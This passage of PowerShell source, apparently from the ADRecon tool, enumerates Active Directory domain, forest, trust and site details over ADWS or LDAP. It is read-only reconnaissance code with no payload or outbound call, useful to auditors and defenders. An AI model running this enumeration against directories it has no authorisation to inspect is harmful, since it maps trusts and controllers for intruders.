                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                $ADObject.dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain."
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }

            Try
            {
                $RIDManager = ([ADSI]"LDAP://CN=RID Manager$,CN=System,$($objDomain.distinguishedName)")
                $RIDproperty = $ObjDomain.ConvertLargeIntegerToInt64($RIDManager.Properties.rIDAvailablePool.value)
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName)"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
        }

        If ($ADDomain)
        {
            $DomainObj = @()


            $FLAD = @{
	            0 = "Windows2000";
	            1 = "Windows2003/Interim";
	            2 = "Windows2003";
	            3 = "Windows2008";
	            4 = "Windows2008R2";
	            5 = "Windows2012";
	            6 = "Windows2012R2";
	            7 = "Windows2016"
            }
            $DomainMode = $FLAD[[convert]::ToInt32($objDomainRootDSE.domainFunctionality,10)] + "Domain"
            Remove-Variable FLAD

            $ObjValues = @("Name", $ADDomain.Name, "NetBIOS", $objDomain.dc.value, "Functional Level", $DomainMode, "DomainSID", $ADDomainSID.Value)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain.DomainControllers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Domain Controller"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADDomain.DomainControllers[$i]
                $DomainObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Creation Date"
            $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $objDomain.whencreated.value
            $DomainObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "ms-DS-MachineAccountQuota"
            $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $objDomain.'ms-DS-MachineAccountQuota'.value
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "RIDs Issued"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "RIDs Remaining"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($DomainObj)
    {
        Return $DomainObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRForest
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning "[Get-ADRForest] Error getting Domain Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        Try
        {
            $ADForest = Get-ADForest $ADDomain.Forest
        }
        Catch
        {
            Write-Verbose "[Get-ADRForest] Error getting Forest Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        Remove-Variable ADDomain

        If (-Not $ADForest)
        {
            Try
            {
                $ADForest = Get-ADForest -Server $DomainController
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
        }

        If ($ADForest)
        {

            Try
            {
                $ADForestCNC = (Get-ADRootDSE).configurationNamingContext
                $ADForestDSCP = Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,$($ADForestCNC)" -Partition $ADForestCNC -Properties *
                $ADForestTombstoneLifetime = $ADForestDSCP.tombstoneLifetime
                Remove-Variable ADForestCNC
                Remove-Variable ADForestDSCP
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error retrieving Tombstone Lifetime"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }


            If ([convert]::ToInt32($ADForest.ForestMode) -ge 6)
            {
                Try
                {
                    $ADRecycleBin = Get-ADOptionalFeature -Identity "Recycle Bin Feature"
                }
                Catch
                {
                    Write-Warning "[Get-ADRForest] Error retrieving Recycle Bin Feature"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }


            If ([convert]::ToInt32($ADForest.ForestMode) -ge 7)
            {
                Try
                {
                    $PrivilegedAccessManagement = Get-ADOptionalFeature -Identity "Privileged Access Management Feature"
                }
                Catch
                {
                    Write-Warning "[Get-ADRForest] Error retrieving Privileged Acceess Management Feature"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }

            $ForestObj = @()


            $FLAD = @{
                0 = "Windows2000";
                1 = "Windows2003/Interim";
                2 = "Windows2003";
                3 = "Windows2008";
                4 = "Windows2008R2";
                5 = "Windows2012";
                6 = "Windows2012R2";
                7 = "Windows2016"
            }
            $ForestMode = $FLAD[[convert]::ToInt32($ADForest.ForestMode)] + "Forest"
            Remove-Variable FLAD

            If (-Not $ForestMode)
            {
                $ForestMode = $ADForest.ForestMode
            }

            $ObjValues = @("Name", $ADForest.Name, "Functional Level", $ForestMode, "Domain Naming Master", $ADForest.DomainNamingMaster, "Schema Master", $ADForest.SchemaMaster, "RootDomain", $ADForest.RootDomain, "Domain Count", $ADForest.Domains.Count, "Site Count", $ADForest.Sites.Count, "Global Catalog Count", $ADForest.GlobalCatalogs.Count)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest.Domains.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Domain"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.Domains[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.Sites.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Site"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.Sites[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.GlobalCatalogs.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "GlobalCatalog"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.GlobalCatalogs[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Tombstone Lifetime"
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Not Retrieved"
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Recycle Bin (2008 R2 onwards)"
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin.EnabledScopes.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Enabled"
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin.EnabledScopes.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Enabled Scope"
                        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADRecycleBin.EnabledScopes[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Privileged Access Management (2016 onwards)"
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement.EnabledScopes.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Enabled"
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement.EnabledScopes.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Enabled Scope"
                        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $PrivilegedAccessManagement.EnabledScopes[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                $ForestObj += $Obj
            }
            Remove-Variable ADForest
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable DomainContext

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest",$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Remove-Variable ADDomain
            Try
            {
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable ForestContext


            Try
            {
                $SearchPath = "CN=Directory Service,CN=Windows NT,CN=Services"
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.configurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.Filter="(name=Directory Service)"
                $objSearcherResult = $objSearcherPath.FindAll()
                $ADForestTombstoneLifetime = $objSearcherResult.Properties.tombstoneLifetime
                Remove-Variable SearchPath
                $objSearchPath.Dispose()
                $objSearcherPath.Dispose()
                $objSearcherResult.Dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRForest] Error retrieving Tombstone Lifetime"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                Try
                {
                    $SearchPath = "CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration"
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $ADRecycleBin = $objSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    $objSearchPath.Dispose()
                    $objSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRForest] Error retrieving Recycle Bin Feature"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }

            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                Try
                {
                    $SearchPath = "CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration"
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $PrivilegedAccessManagement = $objSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    $objSearchPath.Dispose()
                    $objSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRForest] Error retrieving Privileged Access Management Feature"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()


            $ADForestTombstoneLifetime = ([ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$($objDomainRootDSE.configurationNamingContext)").tombstoneLifetime.value


            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                $ADRecycleBin = ([ADSI]"LDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName)")
            }

            If ([convert]::ToInt32($objDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                $PrivilegedAccessManagement = ([ADSI]"LDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName)")
            }
        }

        If ($ADForest)
        {
            $ForestObj = @()


            $FLAD = @{
	            0 = "Windows2000";
	            1 = "Windows2003/Interim";
	            2 = "Windows2003";
	            3 = "Windows2008";
	            4 = "Windows2008R2";
	            5 = "Windows2012";
	            6 = "Windows2012R2";
                7 = "Windows2016"
            }
            $ForestMode = $FLAD[[convert]::ToInt32($objDomainRootDSE.forestFunctionality,10)] + "Forest"
            Remove-Variable FLAD

            $ObjValues = @("Name", $ADForest.Name, "Functional Level", $ForestMode, "Domain Naming Master", $ADForest.NamingRoleOwner, "Schema Master", $ADForest.SchemaRoleOwner, "RootDomain", $ADForest.RootDomain, "Domain Count", $ADForest.Domains.Count, "Site Count", $ADForest.Sites.Count, "Global Catalog Count", $ADForest.GlobalCatalogs.Count)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest.Domains.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Domain"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.Domains[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.Sites.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Site"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.Sites[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.GlobalCatalogs.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "GlobalCatalog"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForest.GlobalCatalogs[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Tombstone Lifetime"
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Not Retrieved"
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Recycle Bin (2008 R2 onwards)"
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin.Properties.'msDS-EnabledFeatureBL'.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Enabled"
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin.Properties.'msDS-EnabledFeatureBL'.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Enabled Scope"
                        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADRecycleBin.Properties.'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Privileged Access Management (2016 onwards)"
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'.Count -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Enabled"
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'.Count); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Enabled Scope"
                        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $PrivilegedAccessManagement.Properties.'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value "Disabled"
                $ForestObj += $Obj
            }

            Remove-Variable ADForest
        }
    }

    If ($ForestObj)
    {
        Return $ForestObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRTrust
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )


    $TDAD = @{
        0 = "Disabled";
        1 = "Inbound";
        2 = "Outbound";
        3 = "BiDirectional";
    }


    $TTAD = @{
        1 = "Downlevel";
        2 = "Uplevel";
        3 = "MIT";
        4 = "DCE";
    }

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADTrusts = Get-ADObject -LDAPFilter "(objectClass=trustedDomain)" -Properties DistinguishedName,trustPartner,trustdirection,trusttype,TrustAttributes,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning "[Get-ADRTrust] Error while enumerating trustedDomain Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.ADWSClass]::ObjectCount($ADTrusts))"

            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {

                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Source Domain" -Value (Get-DNtoFQDN $_.DistinguishedName)
                $Obj | Add-Member -MemberType NoteProperty -Name "Target Domain" -Value $_.trustPartner
                $TrustDirection = [string] $TDAD[$_.trustdirection]
                $Obj | Add-Member -MemberType NoteProperty -Name "Trust Direction" -Value $TrustDirection
                $TrustType = [string] $TTAD[$_.trusttype]
                $Obj | Add-Member -MemberType NoteProperty -Name "Trust Type" -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_.TrustAttributes -band 0x00000001) { $TrustAttributes += "Non Transitive," }
                If ([int32] $_.TrustAttributes -band 0x00000002) { $TrustAttributes += "UpLevel," }
                If ([int32] $_.TrustAttributes -band 0x00000004) { $TrustAttributes += "Quarantined," } #SID Filtering
                If ([int32] $_.TrustAttributes -band 0x00000008) { $TrustAttributes += "Forest Transitive," }
                If ([int32] $_.TrustAttributes -band 0x00000010) { $TrustAttributes += "Cross Organization," } #Selective Auth
                If ([int32] $_.TrustAttributes -band 0x00000020) { $TrustAttributes += "Within Forest," }
                If ([int32] $_.TrustAttributes -band 0x00000040) { $TrustAttributes += "Treat as External," }
                If ([int32] $_.TrustAttributes -band 0x00000080) { $TrustAttributes += "Uses RC4 Encryption," }
                If ([int32] $_.TrustAttributes -band 0x00000200) { $TrustAttributes += "No TGT Delegation," }
                If ([int32] $_.TrustAttributes -band 0x00000400) { $TrustAttributes += "PIM Trust," }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.TrimEnd(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name "Attributes" -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.whenCreated))
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value ([DateTime] $($_.whenChanged))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=trustedDomain)"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","trustpartner","trustdirection","trusttype","trustattributes","whencreated","whenchanged"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADTrusts = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRTrust] Error while enumerating trustedDomain Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.LDAPClass]::ObjectCount($ADTrusts))"

            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {

                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Source Domain" -Value $(Get-DNtoFQDN ([string] $_.Properties.distinguishedname))
                $Obj | Add-Member -MemberType NoteProperty -Name "Target Domain" -Value $([string] $_.Properties.trustpartner)
                $TrustDirection = [string] $TDAD[$_.Properties.trustdirection]
                $Obj | Add-Member -MemberType NoteProperty -Name "Trust Direction" -Value $TrustDirection
                $TrustType = [string] $TTAD[$_.Properties.trusttype]
                $Obj | Add-Member -MemberType NoteProperty -Name "Trust Type" -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000001) { $TrustAttributes += "Non Transitive," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000002) { $TrustAttributes += "UpLevel," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000004) { $TrustAttributes += "Quarantined," } #SID Filtering
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000008) { $TrustAttributes += "Forest Transitive," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000010) { $TrustAttributes += "Cross Organization," } #Selective Auth
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000020) { $TrustAttributes += "Within Forest," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000040) { $TrustAttributes += "Treat as External," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000080) { $TrustAttributes += "Uses RC4 Encryption," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000200) { $TrustAttributes += "No TGT Delegation," }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000400) { $TrustAttributes += "PIM Trust," }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.TrimEnd(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name "Attributes" -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value ([DateTime] $($_.Properties.whenchanged))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($ADTrustObj)
    {
        Return $ADTrustObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSite
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $SearchPath = "CN=Sites"
            $ADSites = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter "(objectClass=site)" -Properties Name,Description,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning "[Get-ADRSite] Error while enumerating Site Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.ADWSClass]::ObjectCount($ADSites))"

            $ADSiteObj = @()
            $ADSites | ForEach-Object {

                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name "Description" -Value $_.Description
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value $_.whenChanged
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $SearchPath = "CN=Sites"
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = "(objectClass=site)"
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $ADSites = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRSite] Error while enumerating Site Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.LDAPClass]::ObjectCount($ADSites))"

            $ADSiteObj = @()
            $ADSites | ForEach-Object {

                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Name" -Value $([string] $_.Properties.name)
                $Obj | Add-Member -MemberType NoteProperty -Name "Description" -Value $([string] $_.Properties.description)
                $Obj | Add-Member -MemberType NoteProperty -Name "whenCreated" -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name "whenChanged" -Value ([DateTime] $($_.Properties.whenchanged))
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($ADSiteObj)
    {
        Return $ADSiteObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSubnet
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
